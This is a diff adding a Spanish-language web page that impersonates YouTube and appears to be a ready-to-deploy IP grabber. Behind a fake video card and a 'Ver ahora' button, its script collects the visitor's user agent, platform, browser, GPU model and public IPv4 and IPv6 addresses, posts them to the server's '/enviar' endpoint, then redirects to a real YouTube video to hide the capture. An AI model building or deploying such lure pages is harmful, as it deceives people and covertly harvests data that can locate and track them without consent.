@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>YouTube</title>
+  
+  <meta property="og:title" content="YouTube">
+  <meta property="og:description" content="Has sido invitado a ver este video">
+  <meta property="og:image" content="https://www.youtube.com/img/desktop/yt_1200.png">
+  <meta property="og:url" content="https://TU-DOMINIO-FUTURO.com">
+  <meta property="og:type" content="website">
+  <meta name="theme-color" content="#ff0000">
+  
+  <link rel="stylesheet" href="/static/youtube.css">
+</head>
+<body>
+  <div class="yt-container">
+    <header class="yt-header">
+      <div class="yt-logo">
+        <svg viewBox="0 0 90 20" width="90" height="20">
+          <path fill="#FF0000" d="M27.9727 3.12324C27.6435 1.80904 26.6971 0.862552 25.3828 0.533215C23.2197 -0.00192285 14.2857 -0.00192285 14.2857 -0.00192285C14.2857 -0.00192285 5.35166 -0.00192285 3.18855 0.533215C1.87433 0.862552 0.927877 1.80904 0.59854 3.12324C0.0635138 5.28636 0.0635138 10 0.0635138 10C0.0635138 10 0.0635138 14.7137 0.59854 16.8768C0.927877 18.191 1.87433 19.1375 3.18855 19.4668C5.35166 20.0019 14.2857 20.0019 14.2857 20.0019C14.2857 20.0019 23.2197 20.0019 25.3828 19.4668C26.6971 19.1375 27.6435 18.191 27.9727 16.8768C28.5077 14.7137 28.5077 10 28.5077 10C28.5077 10 28.5077 5.28636 27.9727 3.12324Z"/>
+          <path fill="white" d="M11.4253 14.2854L18.8477 10.0001L11.4253 5.71489V14.2854Z"/>
+        </svg>
+        <span>YouTube</span>
+      </div>
+    </header>
+
+    <div class="video-card">
+      <div class="thumbnail-container">
+        <img id="video-thumb" src="https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" alt="Video" class="thumbnail">
+        <div class="play-overlay">
+          <div class="play-button">▶</div>
+        </div>
+      </div>
+
+      <div class="video-info">
+        <h1 id="video-title">Video recomendado para ti</h1>
+        <p id="video-desc">Haz clic para continuar y ver el video.</p>
+        <button id="playBtn" class="yt-btn">Ver ahora</button>
+      </div>
+    </div>
+
+    <div id="status"></div>
+  </div>
+
+  <script>
+    // ====================== CONFIGURACIÓN FÁCIL ======================
+    const REDIRECT_URL = "https://youtu.be/4AdP6WtYZ9Y?si=rd3jp9VvrPu2A6hK";
+    const VIDEO_TITLE = "Crusader";
+    const VIDEO_THUMB = "https://i.ytimg.com/vi/4AdP6WtYZ9Y/maxresdefault.jpg";
+    const VIDEO_DESC  = "Haz clic para ver video";
+    // =================================================================
+
+    document.getElementById("video-title").textContent = VIDEO_TITLE;
+    document.getElementById("video-thumb").src = VIDEO_THUMB;
+    document.getElementById("video-desc").textContent = VIDEO_DESC;
+
+    document.getElementById('playBtn').addEventListener('click', async () => {
+      const btn = document.getElementById('playBtn');
+      const status = document.getElementById('status');
+      
+      btn.disabled = true;
+      btn.textContent = "Cargando...";
+      status.textContent = "Obteniendo información...";
+
+      const data = {
+        user_agent: navigator.userAgent,
+        sistema: navigator.platform || "Desconocido",
+        hostname: window.location.hostname || "N/A",
+        navegador: detectarNavegador(),
+        gpu: detectarGPU(),
+        ipv4: "N/A",
+        ipv6: "N/A"
+      };
+
+      try {
+        const ipv4Res = await fetch('https://api.ipify.org?format=json');
+        const ipv4Data = await ipv4Res.json();
+        data.ipv4 = ipv4Data.ip;
+
+        try {
+          const ipv6Res = await fetch('https://api64.ipify.org?format=json');
+          const ipv6Data = await ipv6Res.json();
+          data.ipv6 = ipv6Data.ip;
+        } catch (e) {
+          data.ipv6 = "No disponible";
+        }
+      } catch (e) {}
+
+      try {
+        await fetch('/enviar', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(data)
+        });
+
+        status.innerHTML = "✅ Redirigiendo al video...";
+        btn.textContent = "Abriendo...";
+        btn.style.background = "#cc0000";
+
+        setTimeout(() => {
+          window.location.href = REDIRECT_URL;
+        }, 1200);
+
+      } catch (e) {
+        status.innerHTML = "❌ Error. Intenta de nuevo.";
+        btn.disabled = false;
+        btn.textContent = "Ver ahora";
+      }
+    });
+
+    function detectarNavegador() {
+      const ua = navigator.userAgent;
+      if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
+      if (ua.includes("Firefox")) return "Firefox";
+      if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+      if (ua.includes("Edg")) return "Edge";
+      if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+      return "Otro";
+    }
+
+    function detectarGPU() {
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return "No disponible";
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+          return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "No detectada";
+        }
+        return "No detectada";
+      } catch (e) {
+        return "No detectada";
+      }
+    }
+  </script>
+</body>
+</html>
